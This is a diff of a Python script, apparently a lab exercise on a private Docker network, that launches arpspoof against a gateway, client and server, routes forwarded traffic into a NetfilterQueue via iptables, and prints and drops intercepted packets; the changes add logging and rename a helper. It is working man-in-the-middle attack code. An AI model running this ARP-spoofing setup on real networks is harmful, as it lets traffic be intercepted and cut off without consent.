@@ -15,12 +15,15 @@ from netfilterqueue import NetfilterQueue
 
 
 def handler_queue_1(pkt: netfilterqueue.Packet):
-    print(pkt)
+    handler_queue_1.pktnum += 1
+    print(f"{handler_queue_1.pktnum}) received " + pkt.__str__())
 
     # as a test, drop each packet after printing it!
     pkt.drop()
 
-def get_ip():
+handler_queue_1.pktnum = 0
+
+def check_internet_connection():
     conn = http.client.HTTPSConnection("8.8.8.8", timeout=5)
     try:
         conn.request("HEAD", "/")
@@ -33,7 +36,7 @@ def get_ip():
 def print_hi(name):
     # Use a breakpoint in the code line below to debug your script.
     print(f"Hi, {name}, i'm {socket.gethostname()} and you can find me at {socket.gethostbyname(socket.gethostname())}")  # Press Ctrl+F8 to toggle the breakpoint.
-    print("Public ip address: ", get_ip())
+    print("Public ip address: ", check_internet_connection())
 
 # Press the green button in the gutter to run the script.
 if __name__ == '__main__':
@@ -59,12 +62,12 @@ if __name__ == '__main__':
             # p = subprocess.Popen(["ifconfig", "-a"], stdout=1, stderr=1) # use this line or open a terminal to check the interface name, should be eth0
             p = list()
             print("starting arpspoofing...")
-            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.1", "172.18.0.2"])) # tell the gateway i'm the client
-            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.2", "172.18.0.1"])) # tell the client i'm the gateway
-            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.1", "172.18.0.3"])) # tell the gateway i'm the server
-            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.3", "172.18.0.1"])) # tell the server i'm the gateway
-            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.3", "172.18.0.2"])) # tell the server i'm the client
-            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.2", "172.18.0.3"])) # tell the client i'm the server
+            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.1", "172.18.0.2"], stdout=fnull, stderr=fnull)) # tell the gateway i'm the client
+            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.2", "172.18.0.1"], stdout=fnull, stderr=fnull)) # tell the client i'm the gateway
+            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.1", "172.18.0.3"], stdout=fnull, stderr=fnull)) # tell the gateway i'm the server
+            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.3", "172.18.0.1"], stdout=fnull, stderr=fnull)) # tell the server i'm the gateway
+            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.3", "172.18.0.2"], stdout=fnull, stderr=fnull)) # tell the server i'm the client
+            p.append(subprocess.Popen(["arpspoof", "-i", "eth0", "-t", "172.18.0.2", "172.18.0.3"], stdout=fnull, stderr=fnull)) # tell the client i'm the server
             # subprocess.Popen(["sysctl", "-w" ,"net.ipv4.ip_forward=1"]) # enable port forwarding for intercepted packets... already active and can't modify it since file system is read only.
             print("arpspoofing started.")
             #The iptables chain of interest is FORWARD, since those packets are not destined to us (172.18.0.4), but to OTHER IPs!!!
@@ -73,6 +76,7 @@ if __name__ == '__main__':
             # And so, IPTABLES, which starts to look into network packets ONLY at layer 3 (IP), THOSE PACKETS ARE NOT DIRECTED TO US AND SO DO NOT PERTAIN TO THE INPUT CHAIN.
             # why this comment? Well, to spare you some time debugging this code!
 
+            print("creating iptables netfilter rules for victim and server...")
             # must capture every packet destined to the server coming from the client, ...
             p.append(subprocess.Popen(
                 ["iptables", "-I", "FORWARD", "-s", "172.18.0.2", "-d", "172.18.0.3", "-j", "NFQUEUE", "--queue-num", "1"]))
@@ -80,11 +84,14 @@ if __name__ == '__main__':
             p.append(subprocess.Popen(
                 ["iptables", "-I", "FORWARD", "-s", "172.18.0.3", "-d", "172.18.0.2",  "-j", "NFQUEUE", "--queue-num","1"]))
             # as they come, they will be ordered in the queue (remember, queues are FIFOs!)
+            print("firewall rules created.")
 
+            print("Binding netfilterqueue socket...")
             nfqueue = NetfilterQueue()
             nfqueue.bind(1, handler_queue_1)
 
             s = socket.fromfd(nfqueue.get_fd(), socket.AF_UNIX, socket.SOCK_STREAM)
+            print("Binded.")
 
             print("Waiting for packets...")
             try:
